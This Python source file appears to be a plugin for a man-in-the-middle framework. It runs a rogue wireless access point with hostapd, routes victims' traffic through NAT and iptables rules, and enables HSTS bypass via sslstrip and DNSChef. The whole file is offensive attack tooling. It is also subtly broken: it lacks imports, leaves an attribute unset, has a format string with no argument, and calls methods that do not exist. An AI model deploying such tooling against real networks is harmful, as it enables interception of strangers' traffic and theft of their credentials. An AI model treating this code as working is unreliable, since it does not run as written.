# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
from plugins.plugin import Plugin

class ManaToolkit(Plugin):
    name      = 'ManaToolkit'
    optname   = 'mana'
    desc      = 'Use Mana Toolkit to perform rogue AP attack.'
    version   = "0.1"
    tree_info = ["Mana Toolkit running."]

    def initialize(self, options):

        from core.sslstrip.URLMonitor import URLMonitor
        from core.servers.DNS import DNSChef
        from core.utils import iptables

        self.options = options
        self.phy = options.phy
        if options.upstream:
            self.upstream = options.upstream

        self.network_manager = NetworkManager.get_instance()
        self.iptables = iptables()

        if options.nat_simple:

            self._initialize_nat_simple()

        elif options.nat_full:

            self._initialize_nat_full()

        elif options.noupstream_all:

            self._initialize_noupstream()

        elif options.noupstream_eap:

            self._initialize_noupstream_eap()

        elif options.noupstream_eaponly:

            self._initialize_noupstream_eaponly()

        elif options.noupstream:

            self._initialize_noupstream()

        URLMonitor.getInstance().setHstsBypass()
        DNSChef().setHstsBypass()

    def _initialize_nat_simple(self):
    
        self.network_manager.stop()
        os.system('rfkill unblock wlan')

        os.system('ifconfig %s up' % self.phy)

        self.hostapd.configure(phy=self.phy, upstream=self.upstream)
        self.hostapd.start()
        time.sleep(5)
        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0')
        os.system('route add -net 10.0.0.1 netmask 255.255.255.0 gw 10.0.0.1')

        # call to dhcpd goes here
        set_ip_forwarding(1)

        self.iptables.ROGUE_AP_NAT(upstream=self.upstream, phy=self.phy)

    def options(self, options):

        group = options.add_mutually_exclusive_group(required=False)

        group.add_argument('--nat-simple',
            dest='nat_simple',
            action='store_true',
            help='Use simple nat.')

        group.add_argument('--nat-full',
            dest='nat_full',
            action='store_true',
            help='Use full nat.')

        group.add_argument('--noupstream-all',
            dest='noupstream_all',
            action='store_true',
            help='Use no upstream all.')

        group.add_argument('--noupstream-eap',
            dest='noupstream_eap',
            action='store_true',
            help='Use no upstream eap.')

        group.add_argument('--noupstream-eaponly',
            dest='noupstream_eaponly',
            action='store_true',
            help='Use no upstream eaponly.')

        group.add_argument('--noupstream',
            dest='noupstream',
            action='store_true',
            help='Use no upstream.')

        options.add_argument('--upstream-iface', 
            dest='upstream',
            type=str,
            required=False,
            help='Gateway iface.')

        options.add_argument('--phy-iface', 
            dest='phy',
            type=str,
            required=False,
            help='AP iface.')

    def on_shutdown(self):
        from core.utils import iptables
        iptables().flush()
